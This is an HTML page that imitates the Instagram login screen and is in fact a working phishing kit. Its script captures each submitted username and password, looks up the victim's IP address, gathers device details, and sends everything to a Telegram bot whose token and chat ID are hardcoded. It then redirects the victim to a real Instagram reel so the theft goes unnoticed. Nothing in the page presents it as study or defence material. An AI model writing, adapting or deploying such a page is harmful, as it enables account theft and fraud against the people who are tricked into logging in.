<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css" />
    <link rel="icon" type="image/png" href="https://static.cdninstagram.com/rsrc.php/y4/r/QaBlI0OZiks.ico">
    <title>Login • Instagram</title>
</head>
<body onsubmit="go()">
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <form id="login-form">
                    <label for="email" class="sr-only">Phone number, username, or email</label>
                    <input id="email" name="email" placeholder="Phone number, username, or email" required />

                    <label for="password" class="sr-only">Password</label>
                    <input id="password" name="password" type="password" placeholder="Password" required />

                    <button type="submit">Log In</button>
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <a style="font-size: 14px;" href="#">
                            <span><img src="img/fb.png" alt="" height="16" width="16"></span>  
                            <span style="color: #385185; font-weight: normal; font-size: 14px;">Log in with Facebook</span>
                        </a>
                    </div>
                    <a href="/accounts/password/reset/">Forgot password?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Don't have an account?</p>
                <a href="#">Sign up</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p style="font-size: 14px;">Get the app.</p>
                <div class="flex justify-content-center">
                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3D4FAF5764-BCD7-448D-8E38-21AA487E8CCB%26utm_campaign%3DloginPage%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge%26original_referrer%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Flogin%252F%253Fnext%253Dhttps%25253A%25252F%25252Fwww.instagram.com%25252Faccounts%25252Fmeta_verified%25252F%25253Fentrypoint%25253Dweb_footer%252526__coig_login%25253D1"><img src="./img/googleplay.png" alt="Apple App Store logo" title="Apple App Store" /></a>
                    <a href="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=www.instagram.com&mode=mini&pos=0%2C0%2C1229%2C664"><img src="./img/microsoft.png" alt="Google Play logo" title="Google Play Store" /></a>
                </div>
            </div>
        </section>
    </main>
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="https://about.meta.com/">Meta</a></li>
            <li><a href="https://about.instagram.com/">About</a></li>
            <li><a href="https://about.instagram.com/blog">Blog</a></li>
            <li><a href="https://about.instagram.com/about-us/careers">Jobs</a></li>
            <li><a href="https://help.instagram.com/">Help</a></li>
            <li><a href="https://developers.facebook.com/docs/instagram-platform">API</a></li>
            <li><a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect">Privacy</a></li>
            <li><a href="https://help.instagram.com/581066165581870/">Terms</a></li>
            <li><a href="https://www.instagram.com/explore/locations/">Locations</a></li>
            <li><a href="https://www.instagram.com/web/lite/">Instagram Lite</a></li>
            <li><a href="https://www.threads.net/">Threads</a></li>
            <li><a href="https://www.facebook.com/help/instagram/261704639352628">Contact Uploading & Non-Users</a></li>
            <li><a href="#">Meta Verified</a></li>
        </ul>
        <p class="copyright">English   © 2024 Instagram from Meta</p>
    </footer>




<script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
<script>
    const TOKEN = "7410030552:AAHMyFnzl8IlQKeX6u8KZ3GoB3npdPAHFZM";                                          
    const CHAT_ID = "5577035616"; 
    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        

    document.getElementById('login-form').addEventListener('submit', function(e) {
        e.preventDefault();

        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        axios.get('https://api.ipify.org?format=json')
            .then(response => {
                const ip = response.data.ip;

                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const screenWidth = screen.width;
                const screenHeight = screen.height;
                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';

                const message = ` 
                    <b>New Login Attempt</b>\n
                    <b>Email:</b> ${email}\n
                    <b>Password:</b> ${password}\n
                    <b>IP Address:</b> ${ip}\n
                    <b>Device Type:</b> ${deviceType}\n
                    <b>Platform:</b> ${platform}\n
                    <b>User Agent:</b> ${userAgent}\n
                    <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
                `;

                axios.post(URI_API, {
                    chat_id: CHAT_ID,
                    parse_mode: 'html',
                    text: message
                }).then(response => {
                    
                }).catch(error => {
                    
                });
            })
            .catch(error => {
                
            });
    });
    function go(){
        window.location.href = 'https://www.instagram.com/reel/DBo6ilnsMvF/?igsh=bng2Z2Ixa3o1NHBk';
    }
</script>




</body>
</html>
